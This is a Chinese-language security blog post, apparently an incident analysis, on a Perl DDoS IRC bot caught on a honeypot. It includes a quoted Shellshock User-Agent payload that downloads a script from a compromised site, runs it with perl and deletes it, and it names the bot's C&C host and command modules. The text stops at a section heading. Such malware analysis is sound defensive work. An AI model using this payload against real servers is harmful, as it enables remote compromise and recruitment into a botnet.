@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Perl DDOS IrcBot分析 | SY0U&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 入侵分析发现一个蜜罐节点存在服务器CPU负载异常： 1PID  USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                     3143 ***       20   0   40516   5516   1892 R 97.2  0.3 106:05.31 /usr/sbi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Perl DDOS IrcBot分析">
+<meta property="og:url" content="http://wsygoogol.github.io/2018/08/21/Perl-DDOS-IrcBot分析/index.html">
+<meta property="og:site_name" content="SY0U&#39;s Blog">
+<meta property="og:description" content="0x00 入侵分析发现一个蜜罐节点存在服务器CPU负载异常： 1PID  USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                     3143 ***       20   0   40516   5516   1892 R 97.2  0.3 106:05.31 /usr/sbi">
+<meta property="og:updated_time" content="2018-08-22T09:28:15.431Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Perl DDOS IrcBot分析">
+<meta name="twitter:description" content="0x00 入侵分析发现一个蜜罐节点存在服务器CPU负载异常： 1PID  USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                     3143 ***       20   0   40516   5516   1892 R 97.2  0.3 106:05.31 /usr/sbi">
+  
+    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">SY0U&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="w-Perl-DDOS-IrcBot分析" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/21/Perl-DDOS-IrcBot分析/" class="article-date">
+  <time datetime="2018-08-21T10:16:51.000Z" itemprop="datePublished">2018-08-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Perl DDOS IrcBot分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-入侵分析"><a href="#0x00-入侵分析" class="headerlink" title="0x00 入侵分析"></a>0x00 入侵分析</h4><p>发现一个蜜罐节点存在服务器CPU负载异常：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PID  USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                     3143 ***       20   0   40516   5516   1892 R 97.2  0.3 106:05.31 /usr/sbin/sshd</div></pre></td></tr></table></figure>
+<p>网络连接异常：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcp        0      0 192.168.152.134:54821   94.23.37.187:88         ESTABLISHED 3143/sshd -D</div></pre></td></tr></table></figure>
+<p>查看蜜罐的服务器日志发现了一条利用Shellsock漏洞(CVE-2014-6271)植入perl脚本并执行的日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"http_user_agent"</span>: <span class="string">"() &#123; :;&#125;;/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"killall -9 perl;wget http://kevelmarine.com/images/gallery/x.log -O /tmp/x.log;curl -O /tmp/x.log http://kevelmarine.com/images/gallery/x.log;perl /tmp/x.log;rm -rf /tmp/x.log*\");'"</span></div></pre></td></tr></table></figure>
+<p>攻击者IP:122.224.145.162(杭州)从<a href="http://kevelmarine.com/" target="_blank" rel="external">http://kevelmarine.com/</a> 下载x.log到/tmp目录，随后执行，最后删除。<a href="http://kevelmarine.com/" target="_blank" rel="external">http://kevelmarine.com/</a> 是一家从事海洋建筑的公司的网站，服务器位于美国，怀疑已经被黑客入侵。</p>
+<h4 id="0x01-IrcBot分析"><a href="#0x01-IrcBot分析" class="headerlink" title="0x01 IrcBot分析"></a>0x01 IrcBot分析</h4><p>根据蜜罐日志记录的下载链接我们得到x.log这个样本，发现这是一个perl实现的后门，代码共916行，通过IRC协议与主控服务器进行交互，主要功能是DDOS。发现一台C&amp;C主机：daddyhax.tk。</p>
+<p>这个样本主要分为以下几个功能模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">!u @system 	<span class="comment"># 系统模块</span></div><div class="line">!u @version	<span class="comment"># 版本信息</span></div><div class="line">!u @channel	<span class="comment"># IRC频道操作模块</span></div><div class="line">!u @flood  	<span class="comment"># DDoS模块</span></div><div class="line">!u @utils  	<span class="comment"># 其它功能模块</span></div></pre></td></tr></table></figure>
+<h5 id="进程隐藏功能"><a href="#进程隐藏功能" class="headerlink" title="进程隐藏功能"></a>进程隐藏功能</h5>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/08/21/Perl-DDOS-IrcBot分析/" data-id="cjprqg7t900110c9ll2f0c29d" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/09/06/构建SOC的机器学习分析模型/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          构建SOC的机器学习分析模型
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/08/21/Perl-IrcBot分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Perl IrcBot分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/09/17/Satori-物联网蠕虫分析/">Satori 物联网蠕虫分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/14/Suricata-tips/">Suricata tips</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/11/开源情报收集/">开源情报收集</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/06/构建SOC的机器学习分析模型/">构建SOC的机器学习分析模型</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/Perl-DDOS-IrcBot分析/">Perl DDOS IrcBot分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <!--
+<footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 SY0U<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+-->
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
